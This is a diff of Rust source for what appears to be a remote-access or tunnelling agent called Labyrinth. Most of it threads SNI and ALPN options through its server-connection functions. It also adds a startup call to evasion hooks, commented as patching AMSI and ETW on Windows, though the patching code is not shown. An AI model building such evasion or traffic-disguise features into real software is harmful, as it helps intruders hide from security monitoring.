@@ -71,8 +71,13 @@ impl AgentCore {
         proxy: Option<String>,
         transport: TransportMode,
         retry: bool,
+        sni: Option<String>,
+        alpn: Vec<String>,
     ) -> Result<()> {
         info!("{} Starting Labyrinth agent...", styling::SUCCESS_INDICATOR);
+
+        // Apply evasion hooks (AMSI/ETW patching on Windows)
+        crate::agent::evasion::EvasionManager::apply_evasion_hooks();
 
         let agent_info =
             SystemInfoCollector::get_system_info_for_server(Some(server_addr), proxy.is_none())
@@ -93,6 +98,8 @@ impl AgentCore {
             proxy,
             transport,
             retry,
+            sni,
+            alpn,
         )
         .await
     }
@@ -105,6 +112,8 @@ impl AgentCore {
         proxy: Option<String>,
         transport: TransportMode,
         retry: bool,
+        sni: Option<String>,
+        alpn: Vec<String>,
     ) -> Result<()> {
         loop {
             // Establish control connection to server
@@ -116,6 +125,8 @@ impl AgentCore {
                     proxy.clone(),
                     transport,
                     retry,
+                    sni.clone(),
+                    alpn.clone(),
                 )
                 .await
                 {
@@ -515,6 +526,8 @@ impl AgentCore {
             None,
             transport,
             true,
+            endpoint.sni,
+            endpoint.alpn,
         )
         .await
     }
@@ -567,6 +580,8 @@ impl AgentCore {
             None,
             transport,
             false,
+            endpoint.sni.clone(),
+            endpoint.alpn.clone(),
         )
         .await?;
         let mut control_stream = control_connection.stream;
@@ -1667,7 +1682,6 @@ impl AgentCore {
 
     // Removed unused reverse port forward helpers; streaming handles data plane
 }
-
 pub async fn run_agent(
     server_addr: &str,
     server_cert_b64: Option<String>,
@@ -1675,6 +1689,8 @@ pub async fn run_agent(
     proxy: Option<String>,
     transport: TransportMode,
     retry: bool,
+    sni: Option<String>,
+    alpn: Vec<String>,
 ) -> Result<()> {
     AgentCore::run_agent(
         server_addr,
@@ -1683,6 +1699,8 @@ pub async fn run_agent(
         proxy,
         transport,
         retry,
+        sni,
+        alpn,
     )
     .await
 }
